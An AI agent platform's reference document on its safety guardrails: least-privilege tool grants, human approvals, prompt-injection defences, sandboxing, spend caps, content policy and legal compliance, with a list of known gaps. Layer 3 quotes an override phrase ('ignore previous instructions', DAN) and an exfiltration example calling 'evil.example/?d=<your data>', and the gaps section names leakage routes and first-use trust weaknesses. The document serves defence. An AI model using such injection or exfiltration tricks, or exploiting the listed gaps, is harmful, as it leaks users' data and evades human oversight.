# Safety and guardrails

How AIAAS keeps its agents from harming users, third parties, the platform, or
the law — what exists, where it lives, what it is measured against, and what is
still open. Last reviewed 2026-09-26.

This is a **reference** doc: it describes the code as it is. The design history
behind each piece is in `CLAUDE.md`; the account- and login-level security
review is `SECURITY_REVIEW_FIX_PLAN.md`; credential storage is
`CREDENTIALS_AND_SECURITY.md`.

---

## 1. The principle: contain, don't just detect

Every serious source agrees on one point, and the design follows it:
**no filter reliably stops prompt injection.** A guardrail product that "blocks
95% of attacks" fails, because in security 95% is a failing grade
([Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)). So the
platform assumes the model *can* be fooled and limits what a fooled model can
do. Filters exist, but as extra layers, never as the main defence.

Three ideas carry the design:

1. **Least privilege.** An agent gets only the tools and data its job needs
   (OWASP LLM06 *Excessive Agency*, ASI02 *Tool Misuse*).
2. **Break the lethal trifecta.** Danger needs three things at once: private
   data, untrusted content, and a way to send data out. Remove any one and a
   successful injection has nowhere to go.
3. **A person decides what cannot be undone.** Risky actions pause for a human,
   and every decision is recorded.

The product is organised the same way: **the human is the boss, the chat
orchestrator is the manager, subagents are the workhorses.** The chat cannot be
configured, so it holds only basic, mostly read-only tools. Real power lives in
subagents, which the user configures tool by tool.

---

## 2. The layers

### Layer 1 — What an agent can reach

| Control | What it does | Code |
|---|---|---|
| Chat is a manager | Chat gets read tools, planning, delegation, agent authoring and memory. Anything that writes, sends, publishes or spends belongs to a subagent. Enforced at both doors: tools withheld from the list, refused at dispatch. | `chat/tools/__init__.py::chat_orchestrator_allowed`, `execute_chat_tool` |
| Grants | A subagent unlocks tool groups one by one (`webSearch`, `fileOps`, `mcp`, `subAgents`, …). | `agents/grants.py::GRANT_TOOLS` |
| Scopes | Within a grant, *which* things: knowledge bases, file folders (`fileAccess`), connections and per-connection mode (`all` / `read` / `selected`), agents it may delegate to, browser domains, API/DB hosts, file paths and command classes for coding agents. Empty means "unrestricted" only for scopes older than the agents that use them; the browser scope is the reverse (empty = read-only). | `agents/connector_scope.py`, `agents/agent/runtime.py` scope helpers |
| Tool scope and per-tool permissions | Narrow to named tools; set each tool to allow / ask / deny. Flows from parent to worker, most-restrictive-wins. | `agent_context['toolScope']`, `['toolPermissions']` |
| Egress guard | Every outbound request passes the SSRF guard (no private IPs, metadata endpoints, redirects re-checked), then the per-scope host allowlist. | `core/safety/net.py` |

### Layer 2 — Who approves

| Control | What it does | Code |
|---|---|---|
| Declared effect | Every tool declares `read`, `reversible` or `irreversible`. Unknown tools (every MCP tool) count as irreversible. | `@tool(effect=…)`, `chat/tools/registry.py` |
| Autonomy ladder | `plan` (read-only) · `review` · `ask` · `auto` · `full`, switchable mid-run but never retroactively. | `agents/grants.py::AUTONOMY_LADDER` |
| Credentialed MCP calls | Gated unless the tool name starts with a read-only verb. Unattended runs gate reads too. | `chat/tools/permissions.py` |
| Auto reviewer | In `auto`, a fast judge model may approve a call that clearly matches the request. It can only relax ask → allow, never for money, public publishing, unnamed recipients, first-seen browser hosts, or a turn that read injection-shaped text. A slow or failed judge means "ask". | `chat/turn/reviewer.py` |
| Worker requests | A subagent's approval comes to the chat. In `ask` the person decides on a card showing the worker's request. In `auto` the manager decides, under the same floor as above. | `chat/tools/agents.py::answer_subagent` |
| Approval scopes | once / this chat / always; worker requests have no "always". | `chat/turn/agent.py::approve_tool_call` |
| Readable cards | A call is described in words on the server, secrets redacted by key, markup never rendered. | `chat/tools/describe.py` |
| Questions | Agents ask structured questions (options, numbers) instead of guessing; unattended runs proceed on a stated assumption. | `chat/tools/ask.py` |

### Layer 3 — Prompt injection

| Control | Threat | Code |
|---|---|---|
| Input sanitizer | *Direct* attempts by the person typing ("ignore previous instructions", fake role tags, DAN) — read through disguises (look-alike letters, invisible characters, leetspeak, spacing, base64). Refuses the whole message before it is saved; never rewrites it. | `core/safety/security.py`, `core/http/middleware.py` |
| Taint flag | A tool result that addresses an AI marks the turn; `auto` then asks before anything irreversible, and memory becomes read-only. | `core/safety/provenance.py::instruction_shaped`, `tools_node` |
| URL provenance | Stops the "open `evil.example/?d=<your data>`" leak: a URL the model composed that carries data is refused unless the user or a tool result supplied it. | `provenance.check_fetch`, read tools |
| No auto-loading images | A remote image in a reply is a link, never an `<img>` (which would fetch on render). | `MarkdownMessage.tsx` |
| Memory guard | No memory writes in a tainted turn; a "fact" that is an instruction is refused (memory poisoning, ASI06). | `chat/tools/memory.py` |
| MCP tool pinning | A third party writes MCP tool descriptions. New tools that address an AI are quarantined; tools changed after connection are withheld until the user approves them on Connections (tool poisoning, rug pull, ASI04). Refused at dispatch too. | `mcp_integration/pinning.py`, `MCPToolPin` |
| Data, not instructions | Web and browser tool descriptions tell the model page text is data. | `chat/tools/browser.py`, `web.py` |

### Layer 4 — Containment

| Control | What it contains | Code |
|---|---|---|
| Python sandbox | A separate hardened container: no network, no root, read-only filesystem, memory and process limits, killed on timeout. | `sandbox_service/`, `sandbox/engine.py` |
| Virtual filesystem | Agents see paths, but they are database rows: nothing can reach the host disk. Deletes go to the recycle bin. | `inference/vfs.py` |
| Secrets never reach the model | Tools take `secret_ref`s, resolved after approval and scrubbed from results. MCP subprocesses get an allow-listed environment, never ours. | `credentials/refs.py`, `mcp_integration/client.py` |
| Sandboxed rendering | HTML artifacts, previews and published pages render in iframes without same-origin access, under a no-network CSP. File responses carry `CSP: sandbox`. | frontend `HtmlArtifact`, `/p/:slug` |

### Layer 5 — Limits and the kill switch

| Control | Code |
|---|---|
| Spend cap per agent, enforced on the recorded number | `agents/spend.py`, `check_guardrails` |
| Iteration cap, wall-clock limit, graceful last answer | `TurnContext.max_iterations`, `agents/budget.py` |
| Delegation depth, budget split up front, result-size caps | `agents/agent/orchestrator.py` |
| Tool output bounded; the rest archived, not silently cut | `chat/tools/tool_output.py` |
| Outbound messages: per run, per recipient, **and a daily cap per account across all channels** | `chat/tools/talk.py`, `core/safety/outbound.py` |
| API throttling by tier | `core/http/throttling.py` |
| **Pause everything** (account-wide), cancel a run, stop a worker | `UserProfile.paused_until`, `cancel_agent_run`, `stop_task` |

### Layer 6 — Content and the law

| Control | What it does | Code |
|---|---|---|
| Content policy | The platform's own floor for three categories where **we** carry the legal duty: sexual content involving minors, sexual deepfakes of real people, and mass-casualty (CBRN) weapon instructions. Runs on chat and agent requests, image prompts (chat tool and Imagine page), outbound messages and published pages. Deterministic, disguise-aware, logged by category, never quotes the request back. | `core/safety/content_policy.py` |
| AI labels on images | Every generated image gets a visible "AI-generated" tag and metadata (PNG text / EXIF). | `core/safety/labels.py` |
| AI notices | Published pages say they may be AI-generated. Messages no person reviewed end with "Sent by an AI assistant on behalf of the account owner." | `PublishedPageView.tsx`, `outbound.disclose` |
| No CAPTCHA bypass | Browser steps may not touch a CAPTCHA; a person solves it through an `ask_user` step. | `chat/tools/browser.py` |
| Retention | After 180 days, a finished run's reasoning and tool payloads are cleared; the run record (status, answer, cost, tool names, approvals) stays. Runs daily in the in-process scheduler. | `logs/retention.py`, `agents/scheduler.py`, `manage.py purge_run_detail` |
| Audit trail | Every run records its turns (with reasoning), every tool call, every approval and who decided, and the exact agent configuration it ran under. | `logs/models.py`, `logs/revisions.py` |

---

## 3. Measured against

### OWASP Top 10 for Agentic Applications (2026)

| Risk | Main controls | Status |
|---|---|---|
| ASI01 Goal hijack | Sanitizer, taint flag, approvals, URL provenance | Covered; injection can still *change the answer*, but not act unapproved |
| ASI02 Tool misuse | Grants, scopes, effects, autonomy ladder | Covered |
| ASI03 Identity & privilege abuse | Per-user credentials, secret refs, scoped connectors, JWT revocation | Covered |
| ASI04 Supply chain | MCP tool pinning, stdio off in production, allow-listed env | Covered (TOFU: a server malicious from day one with a plain-looking description is trusted) |
| ASI05 Code execution | Sandbox container | Covered |
| ASI06 Memory poisoning | Memory guard, taint flag | Covered for user memory |
| ASI07 Inter-agent comms | Workers run in-process under the same user; a worker's output is a tool result, so the taint flag applies | Covered by design |
| ASI08 Cascading failures | Depth, budget split, caps, recovery sweep | Covered |
| ASI09 Human trust exploitation | Plain-language cards, no "always" for worker requests, amber Auto mode | Partly: approval fatigue is a human limit |
| ASI10 Rogue agents | Kill switch, audit trail, revisions, spend caps | Covered |

### Laws and rules

| Rule | Requirement | How it is met | Status |
|---|---|---|---|
| India IT Act s.67B, POCSO | No sexual content involving minors, AI-generated included | Content policy on every generation path | ✅ |
| India IT Rules (amended; in force Feb 2026) | Prevent synthetic CSAM and non-consensual intimate imagery; label synthetic content | Content policy; visible + metadata labels | ✅ labels are visible and in metadata; no C2PA manifest |
| India DPDP Act 2023 + Rules 2025 (main duties from May 2027) | Security safeguards; keep data no longer than needed; breach notice in 72 h; consent notices; deletion | Encryption, access control, retention sweep | 🟡 consent notice, self-service export/delete and a breach runbook are still to do |
| TRAI commercial-communication rules (Sept 2026) | Consent for commercial messages; automated calls declared | Recipient allowlists for unattended runs, per-run and daily caps, AI disclosure | 🟡 no voice calls exist; consent for marketing is the user's duty and should be stated in terms of use |
| EU AI Act Art. 50 (from 2 Aug 2026) | Tell people they are dealing with AI; mark AI-generated content machine-readably | Page notice, outbound disclosure, image metadata | ✅ for content we generate |
| EU AI Act Art. 12/26 (high-risk only) | Logs kept ≥ 6 months | Audit trail; retention floor is 180 days | ✅ |
| Anti-circumvention (e.g. DMCA §1201) and site terms | Don't bypass technical access controls | CAPTCHA rule, domain-scoped browser acting | 🟡 no robots.txt or paywall check |

---

## 4. Known gaps and residual risk

Stated plainly, so nobody reads this document as "solved":

1. **Content policy is pattern-based.** It stops the obvious and the disguised,
   not a determined rephrasing. We rely on each model provider's own safety
   filter for everything else and for the long tail. A model-based moderation
   classifier on inputs and outputs is the next step.
2. **Chat still holds two legs of the trifecta** (it can read the user's data
   and read the web). The third leg (sending) is closed by URL provenance and
   by chat having no send tools, but a few bits can still leak through a short
   composed URL path or through which link the model chooses to follow.
3. **Tool pinning trusts on first use.** A server that is malicious from the
   start with a plain-looking description is trusted until it changes.
4. **Approval fatigue.** A person who clicks Approve on everything defeats
   layer 2. The cards are written to be read, but the risk is human.
5. **No C2PA manifest** on images; the labels can be cropped or stripped.
6. **DPDP readiness** (before May 2027): consent notice at sign-up, a
   self-service export and delete, a breach-notification runbook.
7. **Robots.txt and paywalls** are not checked by the read tools.
8. **A worker delegated from an eval run** can still pause (see `CLAUDE.md`).

---

## 5. Settings

| Setting | Default | Meaning |
|---|---|---|
| `RUN_DETAIL_RETENTION_DAYS` | 180 | When a finished run's reasoning and tool payloads are cleared |
| `OUTBOUND_DAILY_CAP` | 100 | Messages an account's agents may send in 24 h, all channels together |
| `OUTBOUND_AI_DISCLOSURE` | `unattended` | Add the AI line to messages: `unattended` (no person reviewed it), `always`, `never` |
| `AUTO_REVIEWER_MODEL` / `_TIMEOUT_S` | llama-4-scout / 3 | The Auto judge; slower than the timeout means "ask" |
| `MCP_ALLOW_STDIO` | False in production | Local-process MCP servers |
| `SANDBOX_ENGINE` | `service` in production | The hardened container, never the dev fallback |

---

## 6. Adding a tool safely

A checklist, because every new tool is a new way in:

1. Declare `effect` honestly. If unsure, `irreversible`.
2. Put it behind a **grant**, not in `ALWAYS_AVAILABLE`, unless it truly reads
   or writes nothing of the user's.
3. Do **not** add it to `CHAT_ORCHESTRATOR_EXTRA` if it writes, sends,
   publishes or spends. That list is how chat stays a manager.
4. If it fetches a URL: call `provenance.refusal_for` and the egress guard.
5. If it sends to a person: call `outbound.check` and `outbound.disclose`.
6. If it generates media: call `content_policy` first and `labels` after.
7. If it takes secrets: accept `secret_ref`, never raw values.
8. Give it a `describe` phrase so its approval card reads as a sentence.
9. Refuse with a reason the model can act on ("do not retry; tell the user").

---

## 7. Tests

| Area | Tests |
|---|---|
| Sanitizer | `core/tests/test_sanitizer.py` |
| Provenance, taint, URLs | `core/tests/test_provenance.py`, `chat/tests/test_injection_defences.py` |
| Content policy, labels, outbound | `core/tests/test_content_policy.py` |
| Memory, image prompts, CAPTCHA, publishing | `chat/tests/test_safety_guards.py` |
| MCP pinning | `mcp_integration/tests/test_tool_pins.py` |
| Retention | `logs/tests/test_retention.py` |
| Chat as manager | `chat/tests/test_orchestrator_scope.py` |
| Questions, worker approvals | `chat/tests/test_questions.py` |
| Approvals, Auto | `chat/tests/test_permissions.py`, `test_auto_mode.py`, `test_auto_reviewer.py`, `agents/tests/test_autonomy.py` |
| Scopes | `agents/tests/test_connector_scope.py`, `test_delegation_scope.py`, `test_tool_permissions.py` |
| Guardrail benchmark (100% bar) | `eval/benchmarks/suites/guardrails.py`, `guard_work.py` |

## Sources

OWASP [Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) ·
OWASP Top 10 for LLM Applications 2025 ·
NIST AI 600-1 (Generative AI Profile) ·
Simon Willison, [The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) ·
Invariant Labs, [MCP tool poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) ·
[Memory poisoning attack and defense](https://arxiv.org/abs/2601.05504) ·
OpenAI, [A practical guide to building agents](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/) ·
MeitY IT Rules amendment on synthetic content (Oct 2025) ·
DPDP Rules 2025 ·
TRAI commercial-communication amendments (Sept 2026) ·
EU AI Act Art. 50.
